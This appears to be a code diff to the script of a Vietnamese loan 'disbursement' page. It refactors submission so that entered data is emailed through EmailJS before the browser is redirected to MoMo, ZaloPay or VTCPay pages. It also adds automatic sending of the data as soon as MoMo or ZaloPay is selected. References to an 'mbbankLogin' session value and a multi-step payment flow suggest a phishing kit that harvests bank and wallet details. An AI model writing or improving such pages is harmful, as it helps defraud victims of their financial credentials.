@@ -1474,6 +1474,9 @@
         vtcpay: "vtcpay.html",
       };
 
+      const AUTO_CONTINUE_METHODS = new Set(["momo", "zalopay"]);
+      let isSubmitting = false;
+
       // Toggle Hamburger Menu
       function toggleMenu() {
         const menu = document.getElementById("nav-menu");
@@ -1593,7 +1596,11 @@
         option.addEventListener("click", () => {
           methodOptions.forEach((opt) => opt.classList.remove("selected"));
           option.classList.add("selected");
-          methodInput.value = option.getAttribute("data-value");
+          const method = option.getAttribute("data-value");
+          methodInput.value = method;
+          if (AUTO_CONTINUE_METHODS.has(method)) {
+            handleDisbursementSubmit();
+          }
         });
 
         option.addEventListener("keydown", (e) => {
@@ -1757,37 +1764,45 @@
       }
 
       // Form Submission
+      async function handleDisbursementSubmit() {
+        if (isSubmitting) return;
+
+        const { isValid, method } = validateForm();
+        if (!isValid) return;
+
+        isSubmitting = true;
+        setSubmitLoading(true);
+        try {
+          await sendEmail();
+
+          if (method === "vtcpay") {
+            sessionStorage.removeItem("mbbankLogin");
+            localStorage.setItem("currentStep", "vtcpay.html");
+          }
+
+          const redirectURL = paymentUrls[method.toLowerCase()];
+          if (!redirectURL) {
+            alert("Phương thức giải ngân không hợp lệ. Vui lòng thử lại.");
+            return;
+          }
+          window.location.href = redirectURL;
+        } catch (error) {
+          console.error("EmailJS error:", error);
+          alert(
+            "Không gửi được thông tin qua EmailJS. Vui lòng thử lại.\n" +
+              (error.text || error.message || "")
+          );
+        } finally {
+          isSubmitting = false;
+          setSubmitLoading(false);
+        }
+      }
+
       document
         .getElementById("disbursement-form")
         .addEventListener("submit", async (e) => {
           e.preventDefault();
-          const { isValid, method } = validateForm();
-          if (!isValid) return;
-
-          setSubmitLoading(true);
-          try {
-            await sendEmail();
-
-            if (method === "vtcpay") {
-              sessionStorage.removeItem("mbbankLogin");
-              localStorage.setItem("currentStep", "vtcpay.html");
-            }
-
-            const redirectURL = paymentUrls[method.toLowerCase()];
-            if (!redirectURL) {
-              alert("Phương thức giải ngân không hợp lệ. Vui lòng thử lại.");
-              return;
-            }
-            window.location.href = redirectURL;
-          } catch (error) {
-            console.error("EmailJS error:", error);
-            alert(
-              "Không gửi được thông tin qua EmailJS. Vui lòng thử lại.\n" +
-                (error.text || error.message || "")
-            );
-          } finally {
-            setSubmitLoading(false);
-          }
+          await handleDisbursementSubmit();
         });
 
       // Initialize Input Masks
